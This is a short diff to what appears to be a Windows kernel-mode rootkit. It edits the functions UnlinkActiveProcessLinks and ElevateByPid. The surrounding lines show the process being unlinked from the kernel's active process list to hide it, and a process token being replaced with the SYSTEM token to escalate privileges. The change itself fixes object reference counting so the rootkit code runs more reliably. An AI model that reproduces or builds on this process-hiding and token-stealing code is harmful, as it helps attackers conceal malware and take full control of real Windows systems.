@@ -170,7 +170,7 @@ static NTSTATUS UnlinkActiveProcessLinks(ULONG pid) {
 	CurrListEntry->Flink = CurrListEntry;
 	CurrListEntry->Blink = CurrListEntry;
 
-	// Dereference the target process
+	//decrease reference count of EPROCESS object
 
 	ObDereferenceObject(EProc);
 
@@ -215,7 +215,9 @@ static NTSTATUS ElevateByPid(ULONG pid) {
 	//elevate change the process token to point at the system token
 	InterlockedExchange(reinterpret_cast<PLONG>(reinterpret_cast<unsigned char*>(EProc)+TOKEN_OFFSET),systemToken.Value);
 
-
+	//decrease reference count of EPROCESS objects
+	ObDereferenceObject(EProc);
+	ObDereferenceObject(systemProc);
 
 	return status;
 
